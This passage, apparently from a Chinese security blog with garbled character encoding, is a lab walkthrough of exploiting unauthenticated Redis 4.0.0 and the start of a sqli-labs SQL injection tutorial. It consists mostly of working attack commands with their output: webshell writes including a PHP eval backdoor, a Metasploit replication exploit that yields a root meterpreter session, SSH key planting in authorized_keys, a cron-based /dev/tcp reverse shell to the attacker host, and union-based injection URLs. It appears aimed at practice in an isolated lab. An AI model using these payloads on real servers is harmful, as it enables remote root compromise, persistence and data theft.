<h2 id="å››ã€å¤ç°è¿‡ç¨‹"><a href="#å››ã€å¤ç°è¿‡ç¨‹" class="headerlink" title="å››ã€å¤ç°è¿‡ç¨‹"></a>å››ã€å¤ç°è¿‡ç¨‹</h2><blockquote>
<p>ç¯å¢ƒï¼š</p>
<p>kaliï¼š192.168.1.7</p>
<p>redis(centos7)ï¼š192.168.1.9</p>
</blockquote>
<h3 id="1-ç¯å¢ƒå®‰è£…"><a href="#1-ç¯å¢ƒå®‰è£…" class="headerlink" title="1.ç¯å¢ƒå®‰è£…"></a>1.ç¯å¢ƒå®‰è£…</h3><p><code>æœ¬æ¬¡ä½¿ç”¨4.0.0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä»å®˜ç½‘wgetåˆ°æœ¬åœ°</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.0.tar.gz </span><br><span class="line">tar xzf redis-4.0.0.tar.gz</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">å»æ‰ipç»‘å®šï¼Œå…è®¸é™¤æœ¬åœ°å¤–çš„ä¸»æœºè¿œç¨‹ç™»å½•redisæœåŠ¡</span><br><span class="line">(1)bind 127.0.0.1å‰é¢åŠ ä¸Š##å·æ³¨é‡Šæ‰ æˆ–è€…æ›´æ”¹æˆ 0.0.0.0</span><br><span class="line">(2)protected-modeè®¾ä¸ºno</span><br><span class="line"></span><br><span class="line">å¯åŠ¨</span><br><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><code>ç™»å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.1.9:6379&gt;</span><br></pre></td></tr></table></figure>

<p><code>æ”»å‡»è€…å¸¸ç”¨å‘½ä»¤</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰info                       æŸ¥çœ‹ä¿¡æ¯     </span><br><span class="line">ï¼ˆ2ï¼‰flushall                 åˆ é™¤æ‰€æœ‰ç¼“å­˜æ•°æ®åº“ï¼š</span><br><span class="line">ï¼ˆ3ï¼‰flushdb                    åˆ·æ–°æ•°æ®åº“</span><br><span class="line">ï¼ˆ4ï¼‰çœ‹æ‰€æœ‰é”®ï¼šKEYS *ï¼Œä½¿ç”¨select numå¯ä»¥æŸ¥çœ‹é”®å€¼æ•°æ®ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰set test &quot;who am i&quot;        è®¾ç½®å˜é‡</span><br><span class="line">ï¼ˆ6ï¼‰config set dir dirpath     è®¾ç½®è·¯å¾„ç­‰é…ç½®</span><br><span class="line">ï¼ˆ7ï¼‰config get dir&#x2F;dbfilename  è·å–è·¯å¾„åŠæ•°æ®é…ç½®ä¿¡æ¯</span><br><span class="line">ï¼ˆ8ï¼‰save                       ä¿å­˜</span><br><span class="line">ï¼ˆ9ï¼‰get                        å˜é‡ï¼ŒæŸ¥çœ‹å˜é‡åç§°</span><br></pre></td></tr></table></figure>

<h3 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h3><h4 id="01-å†™å…¥åé—¨æ–‡ä»¶"><a href="#01-å†™å…¥åé—¨æ–‡ä»¶" class="headerlink" title="01.å†™å…¥åé—¨æ–‡ä»¶"></a>01.å†™å…¥åé—¨æ–‡ä»¶</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# ll shell.php</span><br><span class="line">-rw-r--r--. 1 root root 191 Jul 18 02:19 shell.php</span><br><span class="line">[root@mail tmp]# cat shell.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’â–’â–’`used-memï¿½â–’</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’webshell&lt;?php phpinfo();?&gt;â–’hŞŒâ–’Sâ–’+,[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure>

<p><code>å¦ä¸€ç§å†™å…¥webshell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET demo &quot;\n\n\n&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename web.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# cat web.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’`used-memâ–’Øœ</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’â–’demo#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                       â–’â–’?â–’â–’/â–’[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure>

<h4 id="02-MSFè¿›è¡Œåˆ©ç”¨"><a href="#02-MSFè¿›è¡Œåˆ©ç”¨" class="headerlink" title="02.MSFè¿›è¡Œåˆ©ç”¨"></a>02.MSFè¿›è¡Œåˆ©ç”¨</h4><p><code>å…±æœ‰5ä¸ªæ¨¡å—å¯ä»¥åˆ©ç”¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search redis</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/ibm_bigfix_sites_packages_enum           2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line">   1  exploit/windows/browser/ie_createobject                   2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution</span><br><span class="line">   2  auxiliary/scanner/redis/redis_server                                       normal     No     Redis Command Execute Scanner</span><br><span class="line">   3  auxiliary/gather/redis_extractor                                           normal     Yes    Redis Extractor</span><br><span class="line">   4  auxiliary/scanner/redis/file_upload                       2015-11-11       normal     No     Redis File Upload</span><br><span class="line">   5  auxiliary/scanner/redis/redis_login                                        normal     No     Redis Login Utility</span><br><span class="line">   6  exploit/linux/redis/redis_replication_cmd_exec            2018-11-13       good       Yes    Redis Replication Code Execution</span><br><span class="line">   7  exploit/windows/browser/webex_ucf_newobject               2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow</span><br><span class="line">   8  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)</span><br><span class="line">   9  exploit/windows/email/ms07_017_ani_loadimage_chunksize    2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/email/ms07_017_ani_loadimage_chunksize</span><br></pre></td></tr></table></figure>

<h5 id="1-exploit-linux-redis-redis-replication-cmd-exec"><a href="#1-exploit-linux-redis-redis-replication-cmd-exec" class="headerlink" title="1.exploit/linux/redis/redis_replication_cmd_exec"></a>1.exploit/linux/redis/redis_replication_cmd_exec</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 6</span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/redis/redis_replication_cmd_exec):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   CUSTOM    true             yes       Whether compile payload file during exploiting</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   SRVHOST   192.168.1.7      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.</span><br><span class="line">   SRVPORT   6379             yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.1.7      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.7:4444</span><br><span class="line">[*] 192.168.1.9:6379      - Compile redis module extension file</span><br><span class="line">[+] 192.168.1.9:6379      - Payload generated successfully!</span><br><span class="line">[*] 192.168.1.9:6379      - Listening on 192.168.1.7:6379</span><br><span class="line">[*] 192.168.1.9:6379      - Rogue server close...</span><br><span class="line">[*] 192.168.1.9:6379      - Sending command to trigger payload.</span><br><span class="line">[*] Sending stage (3012548 bytes) to 192.168.1.9</span><br><span class="line">[+] 192.168.1.9:6379      - Deleted ./enfgrk.so</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.7:4444 -&gt; 192.168.1.9:58410) at 2021-07-18 02:37:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/root/redis-4.0.0</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 10556 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>

<h5 id="2-auxiliary-scanner-redis-redis-server"><a href="#2-auxiliary-scanner-redis-redis-server" class="headerlink" title="2.auxiliary/scanner/redis/redis_server"></a>2.auxiliary/scanner/redis/redis_server</h5><p><code>æ­¤æ¨¡å—ç”¨æˆ·æ‰«æ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/redis/redis_server):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   COMMAND   INFO             yes       The Redis command to run</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Found redis with INFO command: $2694\x0d\x0a# Server\x0d\x0aredis_version:4.0.0\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:8f4dd5fce9e38cfa\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.10.0-1062.el7.x86_64 x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.5\x0d\x0aprocess_id:10244\x0d\x0arun_id:ce9cb5cafbefebe80c08eec34aaa9072942ee567\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:3107\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:15980436\x0d\x0aexecutable:/root/redis-4.0.0/redis-server\x0d\x0aconfig_file:/root/redis-4.0.0/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:828920\x0d\x0aused_memory_human:809.49K\x0d\x0aused_memory_rss:8384512\x0d\x0aused_memory_rss_human:8.00M\x0d\x0aused_memory_peak:849320\x0d\x0aused_memory_peak_human:829.41K\x0d\x0aused_memory_peak_perc:97.60%\x0d\x0aused_memory_overhead:815206\x0d\x0aused_memory_startup:765576\x0d\x0aused_memory_dataset:13714\x0d\x0aused_memory_dataset_perc:21.65%\x0d\x0atotal_system_memory:1907818496\x0d\x0atotal_system_memory_human:1.78G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:10.11\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1626590065\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:8\x0d\x0atotal_commands_processed:19\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:135811\x0d\x0atotal_net_output_bytes:10866\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:17593e6719397e611d460c1dabbc2367aaef7a0c\x0d\x0amaster_replid2:0d01cdc14e2ca06ce5125014632c67982313d816\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.68\x0d\x0aused_cpu_user:0.86\x0d\x0aused_cpu_sys_children:0.15\x0d\x0aused_cpu_user_children:0.01\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/redis/redis_server) &gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-auxiliary-gather-redis-extractor"><a href="#3-auxiliary-gather-redis-extractor" class="headerlink" title="3.auxiliary/gather/redis_extractor"></a>3.auxiliary/gather/redis_extractor</h5><p><code>è·å–ç‰ˆæœ¬</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/gather/redis_extractor):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD  foobared         no        Redis password for authentication test</span><br><span class="line">   RHOSTS    192.168.1.9      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT     6379             yes       The target port (TCP)</span><br><span class="line">   THREADS   1                yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.9:6379      - Connected to Redis version 4.0.0</span><br><span class="line">[*] 192.168.1.9:6379      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(gather/redis_extractor) &gt;</span><br></pre></td></tr></table></figure>

<h4 id="03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"><a href="#03-å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•" class="headerlink" title="03.å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•"></a>03.<strong>å†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•</strong></h4><blockquote>
<p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalue,keyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyã€‚</p>
</blockquote>
<p><code>kaliå…ˆç”Ÿæˆsshå…¬é’¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh-keygen -t rsa                                                                                                                                     1 â¨¯</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:v7Cz1OKpvm8nlkBgWEmfcXmle+dprjPETRabUpr2pYk root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|   +o.. .. ..    |</span><br><span class="line">|  . +. +. ..  o  |</span><br><span class="line">|   . .o  ..  + + |</span><br><span class="line">|      .    .= = .|</span><br><span class="line">|     .  S .o.B.+ |</span><br><span class="line">|      .  o .Eo=. |</span><br><span class="line">|       .+.o.  +  |</span><br><span class="line">|       o*=..oo   |</span><br><span class="line">|     .+**=. .+.  |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure>

<p><code>å°†å…¬é’¥å†™å…¥key.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# (echo -e &quot;\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQNEvzuCM3mruZvGSf1h6N56NItvVRApcAcPZQqsG8hnTmQCqPMucVqVNJEaPn9/EcOLayXtPkiS8HjEqUBg3OqMJS7YdCedx89uUk2zD4MxbBY4HjBn0zRgtDlGBbopDPnbPIok1jM9agFsHp3hJUlspBHMvKha6iZOGZZOAnjy/Aa4VV9u/idPhpqyIdXKv+EsJ/hgKP27kgxc+sFmm0AUj+KrhoIc7Ah5lW14w+GRSIpxcYfU3Fv9qydOm4bJ4HR/8Fqq15VLUpkfLy93okLDaaK1FZYyQ9cF+2dvrn9hcCFvxX8fQ7D6Xi3AxsWt3L4dWioM9CmEeSCa/vqP3IiAI2rkbq5A6uW+ydDE16OTgDEPQjjInqfy5T/jrqb2OeBaJ4ro7cr04hQWJ/PO6a9+XlW3kEYnb2kdJy3AgBOFAOyhdzY20/8frUJLEyQix6TKC9JCqOp3uGY2z33KseJzPka6tC+Dzco0Y010WQMutneRf+Li5YADJagHPBWU= root@kali</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>å°†key.txtå†™å…¥redisç¼“å†²åŒº</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# cat key.txt | redis-cli -h 192.168.1.9 -x set key</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿™é‡Œå¯èƒ½éœ€è¦å…³é—­RDBæŒä¹…åŒ– 192.168.1.9:6379&gt; config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ç™»å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.1.9</span><br><span class="line">Last login: Sun Jul 18 23:57:55 2021 from 192.168.1.7</span><br><span class="line">[root@mail ~]#</span><br></pre></td></tr></table></figure>

<h4 id="04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell"><a href="#04-cornå®šæ—¶ä»»åŠ¡åå¼¹shell" class="headerlink" title="04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell"></a>04.cornå®šæ—¶ä»»åŠ¡åå¼¹shell</h4><p><code>kaliç›‘å¬</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>kaliç™»å…¥rediså†™å…¥åå¼¹shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; set demo &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.7/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">å‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆ</span></span><br></pre></td></tr></table></figure>

<p><code>å¾—åˆ°shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 35030</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@mail ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>è°ƒæ•™</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli_labs_Page1(basic)</title>
    <url>/2021/01/10/Sqli-labs-Page1-basic/</url>
    <content><![CDATA[<p><strong>Sqli_labs_Page1(basic)</strong></p>
<a id="more"></a>

<h2 id="0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>æ­£å¸¸è®¿é—®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230221905854.png" class>

<p><code>æµ‹è¯•æŠ¥é”™</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222040571.png" class>

<p><code>æ¢æµ‹å­—æ®µæ•°</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure>

<p><code>åˆ°4å›æ˜¾ï¼Œç»“æœä¸º3åˆ—</code></p>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222525420.png" class>

<p><code>unionæ³¨å…¥ï¼Œidéœ€ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ•°ï¼Œè¿›è¡Œçˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,database(),user() -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230223306403.png" class>

<p><code>çˆ†è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>select table_name from information_schema.tables where table_schema=â€™securityâ€™ limit 0,1;ä¸ºæŸ¥è¯¢securityæ•°æ®åº“çš„ç¬¬ä¸€å¼ è¡¨</p>
</blockquote>
<img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225728017.png" class>

<p><code>ä¾æ¬¡ç±»æ¨ï¼ŒæŸ¥è¯¢ç¬¬äºŒã€ä¸‰ã€å››å¼ ~</code></p>
